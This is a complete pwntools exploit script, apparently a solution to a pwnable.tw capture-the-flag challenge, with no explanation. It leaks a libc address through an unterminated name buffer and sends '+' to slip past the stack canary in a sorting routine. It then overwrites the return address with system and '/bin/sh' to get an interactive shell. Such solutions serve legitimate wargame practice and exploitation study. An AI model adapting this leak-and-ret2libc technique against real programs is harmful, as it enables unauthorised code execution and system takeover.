from pwn import *
context.log_level='debug'
lib=ELF('libc_32.so.6')
s=lib.symbols
c=remote('chall.pwnable.tw',10101)
c.recvuntil(':')
pay='a'*24+'\n'
c.send(pay)

leak=u32('\x00'+c.recvuntil(':')[0x1f:0x22])

dt=0x1b0000

vm=leak-dt
print vm
execv=vm+s['system']
sh=vm+next(lib.search('/bin/sh'))

c.send('35\n')
for i in range(24):
	c.recvuntil(':')
	c.send('0\n')


c.recvuntil(':')
c.send('+\n')

for i in range(9):
	c.recvuntil(':')
	c.send(str(execv)+'\n')


c.recvuntil(':')
c.send(str(sh)+'\n')
sleep(2)
c.recv()
c.recv()
c.interactive()

